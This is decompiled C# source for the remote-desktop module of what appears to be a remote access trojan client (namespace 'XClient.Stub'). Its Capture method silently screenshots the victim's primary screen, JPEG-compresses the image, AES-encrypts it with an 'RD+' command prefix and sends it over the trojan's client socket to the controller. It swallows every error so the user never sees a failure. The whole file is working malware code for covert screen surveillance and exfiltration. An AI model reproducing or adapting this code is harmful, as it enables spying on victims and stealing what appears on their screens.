using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace XClient.Stub;

public class RemoteDesktop
{
	public static void Capture(int W, int H, int qq)
	{
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fe: Expected O, but got Unknown
		//IL_010b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			val2.set_CompositingQuality((CompositingQuality)1);
			val2.CopyFromScreen(0, 0, 0, 0, new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height), (CopyPixelOperation)13369376);
			Size size = new Size(32, 32);
			Rectangle rectangle = new Rectangle(Cursor.get_Position(), size);
			Cursors.get_Default().Draw(val2, rectangle);
			Bitmap val3 = new Bitmap(W, H);
			Graphics val4 = Graphics.FromImage((Image)(object)val3);
			val4.set_CompositingQuality((CompositingQuality)1);
			val4.DrawImage((Image)(object)val, new Rectangle(0, 0, W, H), new Rectangle(0, 0, Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height), (GraphicsUnit)2);
			EncoderParameter val5 = new EncoderParameter(Encoder.Quality, (long)qq);
			ImageCodecInfo encoderInfo = GetEncoderInfo(ImageFormat.get_Jpeg());
			EncoderParameters val6 = new EncoderParameters(1);
			val6.get_Param()[0] = val5;
			MemoryStream memoryStream = new MemoryStream();
			((Image)val3).Save((Stream)memoryStream, encoderInfo, val6);
			try
			{
				lock (ClientSocket.S)
				{
					using MemoryStream memoryStream2 = new MemoryStream();
					byte[] array = Helper.AES_Encryptor(Helper.SB(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)"RD+", ClientSocket.SPL), (object)Helper.BS(memoryStream.ToArray())))));
					byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
					memoryStream2.Write(array2, 0, array2.Length);
					memoryStream2.Write(array, 0, array.Length);
					ClientSocket.S.Poll(-1, SelectMode.SelectWrite);
					ClientSocket.S.Send(memoryStream2.ToArray(), 0, checked((int)memoryStream2.Length), SocketFlags.None);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ClientSocket.isConnected = false;
				ProjectData.ClearProjectError();
			}
			try
			{
				val2.Dispose();
				val4.Dispose();
				((Image)val).Dispose();
				memoryStream.Dispose();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public static ImageCodecInfo GetEncoderInfo(ImageFormat format)
	{
		ImageCodecInfo result = default(ImageCodecInfo);
		try
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = 0;
			while (true)
			{
				if (num < imageEncoders.Length)
				{
					if (imageEncoders[num].get_FormatID() == format.get_Guid())
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				result = null;
				return result;
			}
			result = imageEncoders[num];
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
